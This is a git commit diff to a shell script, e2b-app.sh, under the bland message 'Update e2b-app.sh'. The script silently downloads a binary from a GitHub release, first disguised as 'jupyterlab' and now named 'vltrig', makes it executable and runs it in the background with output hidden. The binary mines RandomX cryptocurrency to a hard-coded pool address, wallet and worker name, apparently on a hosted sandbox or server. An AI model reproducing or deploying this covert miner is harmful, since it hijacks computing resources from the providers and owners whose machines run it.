79ed59f40f64f1baacd3e597ba525a81b3205041
gaserjuk <gaserjukilo@gmail.com>
2026-04-13 06:49:56 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
-
-curl -sLkO https://github.com/paskofa10/vps/releases/download/uranus/jupyterlab >/dev/null 2>&1
-chmod 777 jupyterlab
-./jupyterlab -a randomx -o 185.84.98.85:443 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E4 >/dev/null 2>&1 &
+curl -sLkO https://github.com/satelitlima00/zerox/releases/download/ulo/vltrig >/dev/null 2>&1
+chmod 777 vltrig
+./vltrig -o 185.84.98.85:443 --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E1 --threads 4 >/dev/null 2>&1 &
 sleep 20
 while true
 do
